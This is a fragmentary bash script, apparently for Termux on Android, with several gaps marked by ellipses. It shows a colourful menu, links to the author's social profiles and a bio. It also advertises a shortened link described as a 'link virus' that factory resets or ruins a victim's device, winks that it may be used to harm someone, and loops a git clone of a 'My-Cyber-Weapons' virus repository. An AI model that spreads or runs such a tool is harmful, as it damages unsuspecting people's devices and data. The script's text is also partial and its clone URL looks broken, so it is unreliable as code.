...
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Start Generating...."
...
then
am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCL2AcsXxoZtg9ooILUJDKOg > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://www.linkedin.com/in/itsamanyadav18/ > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
...
device it will be factory reset and lot more happens.
         ...
         \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
                                 ...
                                 👆👆👆
Use only for fun purpose not for harming someone(Man kre toh kr skte ho) 😇✌️.
"
echo
...
device will not be recovered.(Antivirus) download kr le wrna gya wo
                    👇👇👇
...
echo -e '\e[91m
         ...
         ────▌──▐────
'
echo -e "\e[93m                  CALL ME \e[92mAman" | pv -qL 10
echo -e "\e[93m             IAM FROM \e[92mNoida" | pv -qL 10
echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m             Maje aaye n" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mWHATS' APP" | pv -qL 10
echo -e "\e[93m        MY WEBSITE:\e[92m www.itsamanyadav1.blogspot.com\e[0m" | pv -qL 10
...
while git clone https://github.com/Its-Aman-Yadav/My-Cyber-Weapons/tree/main/Link%20Virus 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
